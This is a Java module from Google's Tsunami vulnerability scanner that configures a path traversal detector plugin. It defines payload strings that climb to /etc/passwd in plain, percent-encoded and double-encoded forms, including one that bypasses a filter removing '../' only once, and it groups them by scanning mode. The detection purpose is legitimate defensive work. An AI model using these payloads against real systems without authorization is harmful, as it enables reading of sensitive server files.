/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.directorytraversal.genericpathtraversaldetector;

import com.google.common.collect.ImmutableSet;
import com.google.inject.Provides;
import com.google.tsunami.plugin.PluginBootstrapModule;

/** A Guice module that bootstraps the {@link GenericPathTraversalDetector}. */
public final class GenericPathTraversalDetectorBootstrapModule extends PluginBootstrapModule {
  private static final int CHAIN_LENGTH = 30;
  private static final String NON_ENCODED_RELATIVE_PAYLOAD =
      "../".repeat(CHAIN_LENGTH) + "etc/passwd";
  private static final String NON_ENCODED_ABSOLUTE_PAYLOAD = "/etc/passwd";
  private static final String PERCENT_ENCODED_RELATIVE_PAYLOAD =
      "..%2F".repeat(CHAIN_LENGTH) + "etc%2Fpasswd";
  private static final String PERCENT_ENCODED_ABSOLUTE_PAYLOAD = "%2Fetc%2Fpasswd";
  private static final String DOUBLE_PERCENT_ENCODED_RELATIVE_PAYLOAD =
      "..%252F".repeat(CHAIN_LENGTH) + "etc%252Fpasswd";
  private static final String DOUBLE_PERCENT_ENCODED_ABSOLUTE_PAYLOAD = "%252Fetc%252Fpasswd";
  private static final String PERCENT_ENCODED_INCLUDING_DOTS_PAYLOAD =
      "%2E%2E%2F".repeat(CHAIN_LENGTH) + "etc%2Fpasswd";
  private static final String DOUBLE_PERCENT_ENCODED_INCLUDING_DOTS_PAYLOAD =
      "%252E%252E%252F".repeat(CHAIN_LENGTH) + "etc%252Fpasswd";
  private static final String FULL_DOUBLE_PERCENT_ENCODED_RELATIVE_PAYLOAD =
      "%25%32%65%25%32%65%25%32%66".repeat(CHAIN_LENGTH) + "etc%25%32%66passwd";
  private static final String FULL_DOUBLE_PERCENT_ENCODED_ABSOLUTE_PAYLOAD =
      "%25%32%66etc%25%32%66passwd";
  // ..(../)/ bypasses an insufficient Path Traversal mitigation that replaces ../ only once
  private static final String BASIC_MITIGATION_BYPASSING_PAYLOAD =
      "....%2F%2F".repeat(CHAIN_LENGTH) + "etc%2Fpasswd";

  @Override
  protected void configurePlugin() {
    // registerPlugin method is required in order for the Tsunami scanner to identify the plugin.
    registerPlugin(GenericPathTraversalDetector.class);
  }

  @Provides
  GenericPathTraversalDetectorConfig provideGenericPathTraversalDetectorConfig() {
    return GenericPathTraversalDetectorConfig.create(
        ImmutableSet.of(
            new RootInjection(), new GetParameterInjection(), new PathParameterInjection()),
        /* maxCrawledUrlsToFuzz= */ 50,
        /* maxExploitsToTest= */ 250,
        /**
         * TODO(b/202565385) Add a command line parameter to configure the scanning mode. Ideally,
         * it should be possible to pass the scanning mode (QUICK/SMART/EXHAUSTIVE) via a command
         * line parameter to configure Tsunami to do either QUICK, SMART, or EXHAUSTIVE scanning.
         */
        getPayloadsForScanningMode(Mode.QUICK));
  }

  private static ImmutableSet<String> getPayloadsForScanningMode(Mode scanningMode) {
    switch (scanningMode) {
      case QUICK:
        return ImmutableSet.of(PERCENT_ENCODED_RELATIVE_PAYLOAD, PERCENT_ENCODED_ABSOLUTE_PAYLOAD);
      case SMART:
        return ImmutableSet.of(
            PERCENT_ENCODED_INCLUDING_DOTS_PAYLOAD,
            PERCENT_ENCODED_ABSOLUTE_PAYLOAD,
            FULL_DOUBLE_PERCENT_ENCODED_RELATIVE_PAYLOAD,
            FULL_DOUBLE_PERCENT_ENCODED_ABSOLUTE_PAYLOAD,
            BASIC_MITIGATION_BYPASSING_PAYLOAD);
      case EXHAUSTIVE:
        return ImmutableSet.of(
            NON_ENCODED_RELATIVE_PAYLOAD,
            NON_ENCODED_ABSOLUTE_PAYLOAD,
            PERCENT_ENCODED_RELATIVE_PAYLOAD,
            PERCENT_ENCODED_ABSOLUTE_PAYLOAD,
            DOUBLE_PERCENT_ENCODED_RELATIVE_PAYLOAD,
            DOUBLE_PERCENT_ENCODED_ABSOLUTE_PAYLOAD,
            PERCENT_ENCODED_INCLUDING_DOTS_PAYLOAD,
            DOUBLE_PERCENT_ENCODED_INCLUDING_DOTS_PAYLOAD,
            FULL_DOUBLE_PERCENT_ENCODED_RELATIVE_PAYLOAD,
            FULL_DOUBLE_PERCENT_ENCODED_ABSOLUTE_PAYLOAD,
            BASIC_MITIGATION_BYPASSING_PAYLOAD);
    }
    return ImmutableSet.of();
  }

  enum Mode {
    QUICK,
    SMART,
    EXHAUSTIVE;
  }
}
